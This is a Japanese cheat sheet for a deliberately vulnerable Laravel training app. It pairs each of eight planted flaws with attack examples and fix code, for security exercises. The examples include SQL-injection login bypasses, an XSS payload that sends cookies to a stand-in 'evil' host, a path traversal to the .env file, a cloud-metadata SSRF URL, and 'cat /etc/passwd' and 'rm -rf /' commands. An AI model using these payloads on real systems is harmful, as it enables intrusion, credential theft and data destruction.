# 脆弱性・攻撃手法・対策カンペ

本プロジェクトに意図的に仕込まれている脆弱性と、想定される攻撃シナリオ・代表的な対策コード例をまとめたチートシートです。演習時のカンペとして活用してください。

---

## 1. ログイン機能のSQLインジェクション (`app/Http/Controllers/LoginController.php`)
- **脆弱性概要**: フォーム入力をそのまま文字列連結してSQL実行。`OR` 条件で認証を迂回できる。
- **攻撃手法例**:
  - ユーザー名: `admin' --`、パスワード: 任意 → `name = 'admin'` 判定のみでログイン。
  - パスワード: `' OR '1'='1` → 全ユーザー照合、いつでもログイン成功。
- **対策案**: プレースホルダを使い、ハッシュ済みパスワードで認証。Laravel標準の`Auth::attempt`を利用すると安全。
  ```php
  use Illuminate\Support\Facades\Auth;
  use Illuminate\Support\Facades\Hash;

  public function login(Request $request)
  {
      $credentials = $request->only('username', 'password');
      if (Auth::attempt(['name' => $credentials['username'], 'password' => $credentials['password']])) {
          $request->session()->regenerate();
          return redirect()->route('comment');
      }
      return back()->withErrors(['login' => 'ユーザー名またはパスワードが違います']);
  }
  ```

## 2. コメント投稿のストアドXSS (`resources/views/comment.blade.php`)
- **脆弱性概要**: `{!! $comment->comment !!}` でノーエスケープ出力。悪意のHTML/JSが保存・再生可能。
- **攻撃手法例**:
  - `<script>alert('XSS');</script>` を投稿し全閲覧者にアラート。
  - `<img src=x onerror="fetch('https://evil/c?k='+document.cookie)">` でCookie流出。
- **対策案**: Bladeの`{{ }}`でエスケープし、必要に応じてサニタイズやCSPを併用。
  ```php
  // resources/views/comment.blade.php
  <span class="user">{{ $comment->user }}</span>：
  {{ $comment->comment }}
  ```

## 3. 任意ファイルダウンロード (`app/Http/Controllers/DownloadController.php`)
- **脆弱性概要**: `file` パラメータを`base_path`へ連結し存在すれば返送。`../../` で機密ファイルを取得可能。
- **攻撃手法例**:
  - `/download/file?file=../../.env` で環境変数ダンプ。
  - `/download/file?file=../storage/app/database.sqlite` 等でDB取得。
- **対策案**: ダウンロード対象をホワイトリスト化し、実ディレクトリを強制する。
  ```php
  // app/Http/Controllers/DownloadController.php
  $allowed = ['manual.pdf', 'terms.txt'];
  $filename = $request->query('file');
  if (!in_array($filename, $allowed, true)) {
      abort(403);
  }
  $path = storage_path('app/downloads/' . $filename);
  if (!file_exists($path)) {
      abort(404);
  }
  return Response::download($path);
  ```

## 4. 任意ファイルアップロード (`app/Http/Controllers/UploadController.php`)
- **脆弱性概要**: 拡張子・MIME検証なし。任意ファイルが`public/uploads`に保存・公開される。
- **攻撃手法例**:
  - `shell.php` をアップし `/storage/uploads/shell.php` でRCE。
  - `.phar`などを利用した多段攻撃。
- **対策案**: バリデーション＋公開領域外に保存し、必要に応じて署名URLで配布。
  ```php
  // app/Http/Controllers/UploadController.php
  $request->validate([
      'file' => 'required|mimes:jpg,png,pdf|max:2048',
  ]);
  $path = $request->file('file')->store('uploads', 'private');
  // 公開が必要なら Storage::disk('private')->response($path) などで配布
  ```

## 5. 危険なデバッグツール (`app/Http/Controllers/DebugController.php`)
- **脆弱性概要**: `/debug` でSSRF（`file_get_contents`）、任意コマンド実行（`shell_exec`）、ユーザー情報ダンプ（`print_r`）を提供。
- **攻撃手法例**:
  - `fetch_url=http://169.254.169.254/latest/meta-data/` でクラウド認証情報窃取。
  - `command=cat /etc/passwd` や `rm -rf /` でサーバー操作。
  - `user_dump=all` で全ユーザー情報閲覧。
- **対策案**: 本番では機能を無効化し、アクセス制御を徹底。安全な代替ツールを使用。
  ```php
  // routes/web.php
  if (app()->environment('local')) {
      Route::get('/debug', [DebugController::class, 'show']);
  }

  // または DebugController 内で abort_if(!auth()->user()->is_admin, 403);
  ```

## 6. プロフィール閲覧のIDOR (`app/Http/Controllers/ProfileController.php`)
- **脆弱性概要**: `/profile?id=任意ID` で他人の情報を取得できる。権限チェックなし。
- **攻撃手法例**:
  - `/profile?id=1` などにアクセスし、他ユーザーのメールやハッシュを閲覧。
- **対策案**: ログインユーザー自身の情報のみ返す、もしくはポリシーで権限チェック。
  ```php
  use Illuminate\Support\Facades\Auth;

  public function show(Request $request)
  {
      $user = Auth::user();
      if (!$user) {
          return redirect()->route('login');
      }
      return view('profile', ['profile' => $user]);
  }
  ```

## 7. GETで状態変更できるCSRF (`app/Http/Controllers/SettingsController.php`)
- **脆弱性概要**: `/settings/update?email_notify=on` 等のGETアクセスでセッション値を変更可。CSRFトークン検証なし。外部サイトに埋め込まれた画像タグでも勝手に変更される恐れがあります。
- **攻撃手法例**:
  - 攻撃ページに `<img src="https://victim/settings/update?email_notify=on">` を埋め込み、意図せず設定変更。
- **対策案**: POST＋CSRFトークンで状態変更を行う。`VerifyCsrfToken`ミドルウェアを活かす。
  ```php
  // routes/web.php
  Route::get('/settings', [SettingsController::class, 'show']);
  Route::post('/settings/update', [SettingsController::class, 'update']);

  // resources/views/settings.blade.php
  <form method="POST" action="{{ route('settings.update') }}">
      @csrf
      <button name="email_notify" value="on">ON</button>
  </form>
  ```

## 8. 任意URLへのオープンリダイレクト (`app/Http/Controllers/RedirectController.php`)
- **脆弱性概要**: `/go?url=https://evil.example` にアクセスすると外部サイトへそのまま遷移。フィッシングに悪用可能。
- **攻撃手法例**:
  - 正規サイトのリンクに見せかけ、`/go?url=https://phishing.example` へ誘導。
- **対策案**: 遷移先をホワイトリスト化、もしくはローカルURLに限定。
  ```php
  use Illuminate\Support\Facades\URL;

  public function go(Request $request)
  {
      $target = $request->query('url', '/');
      if (!URL::isValidUrl($target) || !str_starts_with($target, config('app.url'))) {
          $target = '/';
      }
      return redirect($target);
  }
  ```

---

## 9. 追加で検証したい観点
- CSRFトークン未適用箇所、セッション固定化、SameSite設定などの確認。
- パスワード平文保存・TLS未導入といった運用面での弱点。
- レートリミットや監査ログ、権限分離の有無を点検。

---

演習では各脆弱性を発見・悪用・修正し、最終的に安全な実装へ書き換える手順をまとめてみましょう。
